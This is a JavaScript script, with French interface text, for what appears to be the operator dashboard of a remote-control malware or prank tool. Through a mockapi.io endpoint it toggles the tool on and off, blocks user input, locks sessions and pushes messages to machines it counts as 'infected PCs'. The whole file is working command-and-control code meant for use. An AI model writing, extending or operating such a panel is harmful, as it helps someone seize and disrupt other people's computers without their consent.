const btnIsActive = document.getElementById('btnIsActive');
const btnIntera = document.getElementById("btnIntera")
const SpaIsActive = document.getElementById('SpaIsActive');
const spaIntera = document.getElementById("spaIntera")
const messageForm = document.getElementById('messageForm');
const messageInput = document.getElementById('messageInput');
const messageFeedback = document.getElementById('messageFeedback');
const btnRefresh = document.getElementById('btnRefresh');
const SpaNbPcInfect = document.getElementById('spaNbPcInfect');
const loadingIcon = document.getElementById('loadingIcon');
const btnLockSession = document.getElementById('btnLockSession')
const timeToWait = 10000;
const url = 'https://68138d49129f6313e211a66e.mockapi.io/management/1';
let isActive, isInteraActive;
let messageIncr;
let nbPcInfectIncr;
let nbLockSession;

initialize();

btnIsActive.addEventListener('click', function () {
    isActive = !isActive;
    SpaIsActive.innerText = isActive ? 'Actif' : 'Inactif';
    SpaIsActive.className = isActive ? 'fw-bold status-indicator actif' : 'fw-bold status-indicator inactif';
    btnIsActive.disabled = true;
    const originalText = btnIsActive.innerHTML;
    btnIsActive.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Chargement...`;

    setTimeout(() => {
        btnIsActive.disabled = false;
        btnIsActive.innerHTML = originalText;
    }, timeToWait);

    fetch(url, {
        method: 'PUT',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ isActive: isActive })
    }).catch(error => {
        console.error('Erreur lors de la mise à jour:', error);
        btnIsActive.disabled = false;
        btnIsActive.innerHTML = originalText;
    });
});

btnIntera.addEventListener("click", function() {
    isInteraActive = !isInteraActive
    spaIntera.innerText = isInteraActive ? 'Actif' : 'Inactif';
    spaIntera.className = isInteraActive ? 'fw-bold status-indicator actif' : 'fw-bold status-indicator inactif';
    btnIntera.disabled = true;
    const originalText = btnIntera.innerHTML;
    btnIntera.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Chargement...`;

    setTimeout(() => {
        btnIntera.disabled = false;
        btnIntera.innerHTML = originalText;
    }, timeToWait);

    fetch(url, {
        method: 'PUT',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ blockUserInput: isInteraActive })
    }).catch(error => {
        console.error('Erreur lors de la mise à jour:', error);
        btnIsActive.disabled = false;
        btnIsActive.innerHTML = originalText;
    });
});

messageForm.addEventListener('submit', function (e) {
    e.preventDefault();

    const messageText = messageInput.value;
    const submitButton = messageForm.querySelector('button[type="submit"]');
    const originalText = submitButton.innerHTML;

    submitButton.disabled = true;
    submitButton.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Envoi...`;

    setTimeout(() => {
        submitButton.disabled = false;
        submitButton.innerHTML = originalText;
    }, timeToWait);

    fetch(url, {
        method: 'PUT',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: {
                message: messageText,
                incr: messageIncr + 1
            }
        })
    })
    .then(() => {
        messageInput.value = '';
        messageIncr += 1;
        messageFeedback.className = 'message-feedback success';
        messageFeedback.innerText = 'Message envoyé avec succès !';
        messageFeedback.style.display = 'block';
        setTimeout(() => {
            messageFeedback.style.display = 'none';
        }, 3000);
    })
    .catch(error => {
        console.error('Erreur lors de l\'envoi du message:', error);
        submitButton.disabled = false;
        submitButton.innerHTML = originalText;
        messageFeedback.className = 'message-feedback error';
        messageFeedback.innerText = 'Erreur lors de l’envoi du message.';
        messageFeedback.style.display = 'block';
    });
});

btnRefresh.addEventListener('click', function () {
    btnRefresh.disabled = true;

    const originalText = btnRefresh.innerHTML;
    let secondsLeft = 10;
    btnRefresh.innerText = `Attendez ${secondsLeft}s`;

    const countdown = setInterval(() => {
        secondsLeft--;
        btnRefresh.innerText = `Attendez ${secondsLeft}s`;

        if (secondsLeft <= 0) {
            clearInterval(countdown);
            btnRefresh.disabled = false;
            btnRefresh.innerHTML = originalText;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    nbPcInfectIncr = data.nbPcInfect.nbPcInfectIncr;
                    SpaNbPcInfect.innerText = data.nbPcInfect.nbPcInfect;
                })
                .catch(error => {
                    console.error('Erreur lors de la récupération des données:', error);
                });
        }
    }, 1000);

    fetch(url, {
        method: 'PUT',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            nbPcInfect: {
                nbPcInfect: 0,
                nbPcInfectIncr: nbPcInfectIncr + 1
            }
        })
    })
    .catch(error => {
        console.error('Erreur lors de la mise à jour des données:', error);
        clearInterval(countdown);
        btnRefresh.disabled = false;
        btnRefresh.innerText = originalText;
    });
});

btnLockSession.addEventListener('click', function () {
    btnLockSession.disabled = true;
    const originalText = btnLockSession.innerHTML;
    btnLockSession.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Verrouillage...`;
    nbLockSession += 1

    fetch(url, {
        method: 'PUT',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            nbLockSession: nbLockSession
        })
    })
    .catch(error => {
        console.error('Erreur lors de la mise à jour des données:', error);
    });
        let secondsLeft = 10
        const countdown = setInterval(() => {
            secondsLeft--;
            btnLockSession.innerText = `Attendez ${secondsLeft}s`;

            if (secondsLeft <= 0) {
                clearInterval(countdown);
                btnLockSession.disabled = false;
                btnLockSession.innerHTML = originalText;
            }
        }, 1000);
});

function initialize() {
    fetch(url)
        .then(response => response.json())
        .then(data => {
            isActive = data.isActive;
            isInteraActive = data.blockUserInput;
            SpaIsActive.innerText = isActive ? 'Actif' : 'Inactif';
            spaIntera.innerText = isInteraActive ? 'Actif' : 'Inactif';
            SpaIsActive.className = isActive ? 'fw-bold status-indicator actif' : 'fw-bold status-indicator inactif';
            spaIntera.className = isInteraActive ? 'fw-bold status-indicator actif' : 'fw-bold status-indicator inactif';
            SpaNbPcInfect.innerText = data.nbPcInfect ? data.nbPcInfect.nbPcInfect : '-';
            nbPcInfectIncr = data.nbPcInfect ? data.nbPcInfect.nbPcInfectIncr : 0;
            messageIncr = data.message ? data.message.incr : 0;
            nbLockSession = data.nbLockSession;
        })
        .catch(error => {
            console.error('Erreur lors de l\'initialisation:', error);
            SpaIsActive.innerText = 'Erreur';
            SpaIsActive.className = 'fw-bold text-warning';
        });
}